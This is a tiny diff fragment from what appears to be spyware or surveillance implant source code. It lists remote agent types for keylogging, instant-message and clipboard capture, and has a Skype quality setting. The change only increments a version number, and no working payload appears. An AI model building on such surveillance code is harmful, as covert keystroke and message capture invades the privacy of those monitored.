@@ -94,7 +94,7 @@ u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_IM,
                           OFFT_CLIPBOARD };
 
-u_int gVersion        = 2011032101;
+u_int gVersion        = 2011032102;
 u_int gSkypeQuality   = 0;
 
 // OS version
